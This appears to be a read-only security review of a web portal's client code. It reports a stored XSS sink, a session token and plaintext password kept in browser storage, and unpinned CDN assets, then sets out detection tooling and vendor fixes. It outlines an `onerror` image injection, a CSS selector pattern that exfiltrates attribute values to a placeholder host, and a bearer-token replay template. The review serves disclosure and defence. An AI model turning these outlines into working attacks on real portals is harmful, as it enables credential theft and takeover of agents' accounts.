# Manager portal client-side exposure — 2026-11-03

Three independent ways to reach the same prize: the Manager portal stores the session's Bearer JWT
(and, notably, the plaintext password) in `sessionStorage`, and any script running in the portal
origin can read it. Two paths are client code served by the vendor; the third is the CDN that code
loads. **All observations below are read-only.** No credential was used, no request was mutated,
and no exploit was fired.

Measured 2026-11-03 between 20:30 and 20:50 America/Chicago by fetching the public document and
its assets with an unauthenticated client. The bundle is the one this repo already pins:
`verification/manager-boot-oracle/pinned/manager.js`, sha256
`82c3d4ec9b5d0531b06219761f0b40db20bf07f4f4250eacdabf527e90e01937`, `1.0.280`, 100,121 bytes —
re-fetched live during this measurement and byte-identical to the pin.

## 1. Path #1 — stored XSS in the hierarchy search (player → agent browser)

The player list is rendered by string concatenation, not by DOM text assignment. In
`manager.js` (`pinned/manager.js`, byte offsets are into that pinned file):

| Step      | Location                                    | What it does                                                                                         |
| --------- | ------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| Source    | 60833                                       | `getCompleteHeriarchy` success: `players = e.PLAYERS` (the `getListAgenstByAgent` envelope)          |
| Sink      | 80222 (player branch), 79957 (`all` branch) | `p = "<span>" + e[s].NameFirst.toString().trim() + "</span> "`                                       |
| Execution | 82730                                       | `n.html(e.join(""))` — jQuery `.html()` parses and runs the markup                                   |
| Trigger   | 79957–80222 area                            | a row renders when the typed term is a substring of `customerID`, `Login`, `Password` or `NameFirst` |

`NameFirst` is interpolated raw; `Password` is too (`data-pass`, and visible in the dropdown). There
is no sanitizer in `manager.js`, `util.js` or `security.js` (grep: zero `sanitize` / `escapeHtml` /
`DOMPurify` / `stripTags`). A player who sets `NameFirst` to an image with an `onerror` handler
executes script in the agent's portal origin when the agent searches for that player (the attacker's
own login is a sufficient search term), and can then read:

- `sessionStorage.customerID` — read by the portal itself at boot (`manager.js` byte 1288);
- `sessionStorage.credentials` — written at login (`security.js` byte 16404) as
  `{"code": <Bearer JWT>, "redirect_uri": …, "password": <plaintext>, "customerID": …}`;
- `sessionStorage.credentials.code` — the token the portal re-reads in `verifySession`
  (`security.js` byte 19667) and sends as `Authorization: Bearer`.

Impact is therefore not "act as agent" in the abstract: it is **full manager API access with the
agent's token, plus a reusable plaintext password**, and it survives the session if the password is
reused. `document.cookie` is irrelevant — see §2.

**What this establishes:** the render sink, the data path and the absence of output encoding.
**What it does not establish:** that the player-facing profile update accepts markup in `NameFirst`.
No capture of that form exists in this repo; the write side is assumed, and if the server encodes or
rejects it the path is closed at the source.

## 2. Path #2 — there is no CSRF or cookie surface to steal

Unauthenticated probes on 2026-11-03 (and the recorded authenticated boot request of 2026-11-01):

| Request                                                                    | Result                                                                                                                                       |
| -------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| `POST /qubic/api/Manager/getAuthorizations` (the bundle's internal `path`) | **404** openresty HTML                                                                                                                       |
| `POST /cloud/api/Manager/getAuthorizations` (live route)                   | **401 Authorization Required** openresty HTML                                                                                                |
| same, with `Origin: https://attacker.example`                              | 401, **no `Access-Control-Allow-Origin`**                                                                                                    |
| recorded authenticated `getAuthorizations`                                 | 200; cookies are only `cf_clearance` + `__cf_bm`; the credential is the redacted `Authorization` header; **no `Set-Cookie`, no CSRF header** |

The only `Set-Cookie` on any response is Cloudflare `__cf_bm` (bot management, `HttpOnly`,
`SameSite=None`, `Secure`) — not a session or CSRF credential, and unreadable by script. So there is
no ambient authority to forge cross-site requests with, and §1 does not need one: the token is
readable by the injected script and replayable from anywhere as
`authorization: Bearer <sessionStorage.credentials.code>`. The cookie half of the original
hypothesis is moot.

## 3. Path #3 — the CDN trust root and a test stylesheet in production

`manager.html` is served unauthenticated, 200, and loads **86 distinct external assets** from four
origins: `cdn.fastassets.io` (most), `cdnjs.cloudflare.com` (2), `fonts.googleapis.com`,
`maps.googleapis.com`; plus `cdn.jsdelivr.net` for this repo's own docs page. Measured headers:

- The document sends **no `Content-Security-Policy`** (header and meta), no `X-Frame-Options`, no
  `X-Content-Type-Options`, no `Cache-Control` — HSTS only.
- **No `<script>` or `<link rel="stylesheet">` carries `integrity=`.** A swap at any of those origins
  executes on the next load for every agent; a poisoned copy can also outlive the origin fix because
  the CDN sends `ETag`/`Last-Modified` but no `Cache-Control`, so browsers cache heuristically.
- `cdn.fastassets.io/js/jquery.js` is **jQuery 1.11.0** (2014), served `application/octet-stream`,
  `ACAO: *`, no `nosniff`, no cache directives. Known-EOL versions carry CVE-2019-11358
  (prototype pollution) and CVE-2020-11022/11023 (`.html()` XSS); the §1 sink does not need them, but
  they widen the payload grammar.
- **`manager-test.less` is loaded by the production page** — `?v=109`, the newest rev, 302,941 bytes,
  1,666 selectors of which only 73 overlap `manager.less` (48,658 bytes, `?v=103`). It is loaded
  second, so it wins the cascade. That is a deploy-hygiene finding on its own and confirms the CDN is
  a mutable deploy target, not an immutable artifact store.
- `maps.googleapis.com/maps/api/js?…&key=<redacted>` sends **no ACAO**, so `integrity=` cannot be
  used there (a cross-origin SRI check is also a CORS check; the browser would block the script). The
  URL also carries a Google Maps browser key in public HTML — restrict it by referrer and rotate it;
  the value is deliberately redacted here and in the pin manifest.

CSS is not inert even without JavaScript: with no CSP, a stylesheet can exfiltrate DOM attribute
values with `[attr^="…"] { background: url(//host/…) }`. §1 puts the **player's password in the
`data-pass` attribute**, so a stylesheet compromise is a credential-exfiltration channel as agents
search. It cannot read `sessionStorage`, so the agent's JWT remains out of CSS reach. The current
`manager-test.less` contains no `[data-pass]`/`[data-login]` selectors — this is an ability, not an
observed leak.

## 4. What this repository now does about it

Detection for path #3, in the existing pin pattern:

- `verification/manager-boot-oracle/pinned/cdn-manifest.json` — 90 assets (86 discovered from the
  live document, 4 explicit), each with sha256, `sha384-…` SRI, byte count and provenance. The asset
  set is discovered from the live document, so a **new** script is unpinned until reviewed and a
  **removed** one is reported stale.
- `bun run pin:cdn` — fetch live bytes and compare; exit 1 on drift, 2 on an unreachable origin.
  `bun run pin:cdn:update` — recompute and review the diff (human action, never CI).
- `lib/f402_portal_drift_signal.ts` now includes the CDN assets, so `portal:drift:cron` /
  `portal:drift:cron --run-once` alerts on them; CI runs `pin:cdn` on the daily schedule, not on
  every PR, so vendor uptime cannot red ordinary builds.
- `bin/check-innerhtml.ts` — offline gate on tracked HTML: every external script/stylesheet must be
  pinned, carry the manifest's `integrity=`, and declare `crossorigin="anonymous"`; a tag whose
  origin sends no ACAO must **not** carry `integrity=`. It caught the previously unpinned Scalar
  bundle in `docs/index.html`, which is now in the manifest (its committed SRI matched the live
  bytes).
- `sri:apply` — rewrite a local document from the manifest so a hash cannot be hand-typed; the
  vendor patch is generated, not deployed (the live document is vendor-served).
- The two tracked Mini App pages now load `telegram.org/js/telegram-web-app.js` with its pinned SRI.
- `tests/f402_cdn_integrity.test.ts` covers the SHA-384 vector, extraction/normalization, the four
  rejection classes, rewrite behaviour, and that the tracked pages still pass the gate.

Limits, stated so nobody relies on a control that does not exist:

- **`rel="stylesheet/less"` cannot carry SRI.** Browsers only honor `integrity=` on
  `<link rel="stylesheet">` and `<script>`; less.js fetches the `.less` files over XHR and compiles
  them. For those three files the pin manifest is the only control until the vendor precompiles to
  `.css`.
- **`maps.googleapis.com` cannot carry SRI** (no ACAO). It is hash-pinned for drift only.
- **`telegram-web-app.js` is an unversioned, moving URL.** SRI now fails closed when Telegram
  changes it; the durable alternative is to self-host a reviewed copy. This trade-off is deliberate
  and reversible.
- Pinning is detection. It does not stop a bad asset from being served; it makes the swap visible.

## 5. Upstream actions (not this repository's to deploy)

| Pri | Action                                                                                                                   | Why                                             |
| --- | ------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------- |
| P0  | Remove `data-pass` and plaintext `Password` from the API response and the DOM; escape `NameFirst` at render              | Root cause of path #1; pinning does not fix it  |
| P0  | Add `integrity=` + `crossorigin="anonymous"` to every CDN script/stylesheet in `manager.html` (manifest-provided)        | Prevention for path #3, where ACAO allows it    |
| P0  | Delete `manager-test.less` from the production bucket and page                                                           | 302 KB test artifact in the critical path       |
| P1  | Precompile the three `.less` files to `.css` and drop `less.js`                                                          | Only way to get SRI on the stylesheets          |
| P1  | Add a document CSP (`script-src` with hashes/hosts, `frame-ancestors 'none'`), `X-Content-Type-Options`, `Cache-Control` | The document currently has none                 |
| P1  | Upgrade jQuery 1.11.0; restrict/rotate the Maps browser key; move the JWT out of `sessionStorage`                        | EOL library, exposed key, script-readable token |
| P2  | Self-host `telegram-web-app.js` instead of SRI-pinning a moving URL                                                      | Removes a third-party load from the Mini App    |

## What this does not establish

This is a client-code and asset review, not a full portal audit. The player-facing write path in
§1 is assumed, not captured. No credential was used and no exploit was executed, so the claims are
about reachable code and pinned bytes, not about a successful takeover. Server-side behaviour
(gateway rules, WAF, response sanitization) was not tested beyond the unauthenticated probes in §2.
